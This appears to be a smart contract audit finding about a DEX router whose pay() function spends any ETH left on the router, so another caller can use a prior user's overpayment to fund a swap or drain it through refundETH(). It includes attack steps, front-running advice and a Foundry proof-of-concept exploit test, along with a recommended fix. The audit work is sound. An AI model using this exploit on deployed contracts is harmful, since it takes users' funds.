The vulnerability is real. Let me trace the exact execution path and confirm the invariant break.

---

### Title
Stranded ETH on Router Consumed by Subsequent Caller's WETH Swap — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

---

### Summary

`PeripheryPayments.pay()` uses `address(this).balance` — the router's **total** native ETH balance — when settling a WETH-input swap, rather than only the current transaction's `msg.value`. Any ETH left on the router from a prior user's overpayment is silently consumed to fund a subsequent caller's WETH deposit, causing direct ETH loss for the prior user.

---

### Finding Description

In `PeripheryPayments.pay()`, when `token == WETH` and `payer != address(this)`, the function reads the router's entire native balance: [1](#0-0) 

```solidity
} else if (token == WETH) {
    uint256 nativeBalance = address(this).balance;   // total router ETH, not msg.value
    if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
    } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
    } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
    }
```

`exactInputSingle` is `payable` and passes `msg.sender` as `payer` into the callback context: [2](#0-1) 

The intended usage pattern (shown in tests) is `multicall{value}([exactInputSingle(...), refundETH()])`: [3](#0-2) 

However, a user who calls `exactInputSingle{value: X}(...)` directly — without a trailing `refundETH()` — leaves `X - amountIn` ETH stranded on the router. There is no on-chain enforcement requiring `msg.value == amountIn` or that `refundETH()` is called.

**Attack path:**

1. **User A** calls `exactInputSingle{value: 2 ether}(...)` with `tokenIn = WETH`, `amountIn = 1 ether`. `pay()` deposits 1 ETH as WETH and sends it to the pool. 1 ETH remains on the router.
2. **Attacker** calls `exactInputSingle{value: 0}(...)` with `tokenIn = WETH`, `amountIn = 1 ether`. `pay()` reads `address(this).balance = 1 ether >= 1 ether`, deposits User A's stranded ETH as WETH, and sends it to the pool. The attacker receives the swap output without paying anything.

The `receive()` guard only blocks plain ETH transfers (no calldata); ETH sent alongside a function call is not blocked: [4](#0-3) 

---

### Impact Explanation

User A suffers a direct, silent loss of their overpaid ETH. The attacker receives a full swap output without providing any input. This is a principal-loss impact: User A's ETH is transferred to the pool on behalf of the attacker. The pool's accounting is internally consistent (it received the correct WETH), so the loss is entirely borne by User A.

---

### Likelihood Explanation

The overpayment scenario is realistic:
- Users commonly send a round ETH amount (e.g., `1 ether`) for a swap whose `amountIn` is a smaller precise value.
- Integrators or wallets may call `exactInputSingle` directly without wrapping in `multicall` + `refundETH()`.
- An attacker can monitor the router's ETH balance on-chain and front-run any `refundETH()` call by submitting a WETH-input swap.

The `refundETH()` function itself is also exploitable as a race: it sends the **entire** router balance to `msg.sender`, so an attacker who calls it before User A does steals the ETH directly: [5](#0-4) 

---

### Recommendation

Track the current transaction's ETH contribution explicitly. The standard fix is to compare `msg.value` (captured at the entry point) against the amount consumed in `pay()`, and only use that bounded amount. One approach:

- In `exactInputSingle` (and all other payable entry points), pass `msg.value` into the transient callback context alongside `payer`.
- In `pay()`, use `min(trackedMsgValue, value)` as the native portion, and pull the remainder from `payer`'s WETH allowance.
- Alternatively, enforce `msg.value == 0` when `tokenIn != WETH`, and enforce `msg.value == amountIn` when `tokenIn == WETH` (exact-input case).

---

### Proof of Concept

```solidity
// Foundry integration test sketch
function test_strandedEthConsumedByAttacker() public {
    uint128 amountIn = 1 ether;
    uint256 overpay = 2 ether;

    // User A overpays: sends 2 ETH but amountIn = 1 ETH
    vm.deal(userA, overpay);
    vm.prank(userA);
    router.exactInputSingle{value: overpay}(ExactInputSingleParams({
        pool: address(pool),
        tokenIn: address(weth),
        tokenOut: address(token1),
        zeroForOne: true,
        amountIn: amountIn,
        amountOutMinimum: 0,
        recipient: userA,
        deadline: block.timestamp + 1,
        priceLimitX64: 0,
        extensionData: ""
    }));
    // 1 ETH remains on router; userA did not call refundETH()
    assertEq(address(router).balance, 1 ether);

    // Attacker sends 0 ETH, gets swap funded by userA's stranded ETH
    vm.prank(attacker);
    router.exactInputSingle{value: 0}(ExactInputSingleParams({
        pool: address(pool),
        tokenIn: address(weth),
        tokenOut: address(token1),
        zeroForOne: true,
        amountIn: amountIn,
        amountOutMinimum: 0,
        recipient: attacker,
        deadline: block.timestamp + 1,
        priceLimitX64: 0,
        extensionData: ""
    }));

    // Router ETH is now 0; attacker received token1 output without paying
    assertEq(address(router).balance, 0);
    assertGt(token1.balanceOf(attacker), 0);
    // userA lost 1 ETH silently
}
```

**Note on the question's specific revert-after-pay mechanism:** A revert inside `pool.swap()` would unwind the entire transaction including the ETH transfer, so no ETH would be stranded via that path. The actual stranding mechanism is **overpayment without `refundETH()`**, which is a realistic and unguarded path. The core invariant break — `pay()` consuming any ETH on the router regardless of who deposited it — is confirmed.

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L32-34)
```text
  receive() external payable {
    if (msg.sender != WETH) revert NotWETH();
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L58-63)
```text
  function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
      _transferETH(msg.sender, balance);
    }
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L73-84)
```text
    } else if (token == WETH) {
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
      } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
      } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
      }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L67-86)
```text
  function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut) {
    _checkDeadline(params.deadline);
    uint128 priceLimitX64 = MetricOmmSwapPath.normalizePriceLimit(params.zeroForOne, params.priceLimitX64);

    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
      );
    int128 out = MetricOmmSwapResults.extractAmountOut(params.zeroForOne, amount0Delta, amount1Delta);
    amountOut = MetricOmmSwapInputs.int128ToUint128(out);
    if (amountOut < params.amountOutMinimum) revert InsufficientOutput(amountOut, params.amountOutMinimum);

    _clearExpectedCallbackPool();
  }
```

**File:** metric-periphery/test/MetricOmmSimpleRouter.native.t.sol (L106-133)
```text
  function test_multicall_ethInput_exactInputSingle_refundsUnusedEth() public {
    uint128 amountIn = 1_000;
    uint256 msgValue = 2 ether;
    uint256 swapperEthBefore = swapper.balance;

    vm.prank(swapper);
    bytes[] memory calls = new bytes[](2);
    calls[0] = abi.encodeWithSelector(
      router.exactInputSingle.selector,
      IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool: address(pool),
        tokenIn: address(weth),
        tokenOut: address(token1),
        zeroForOne: true,
        amountIn: amountIn,
        amountOutMinimum: 0,
        recipient: recipient,
        deadline: _deadline(),
        priceLimitX64: 0,
        extensionData: ""
      })
    );
    calls[1] = abi.encodeWithSelector(router.refundETH.selector);
    router.multicall{value: msgValue}(calls);

    assertEq(swapper.balance, swapperEthBefore - amountIn, "unused eth refunded");
    _assertRouterEmpty();
  }
```
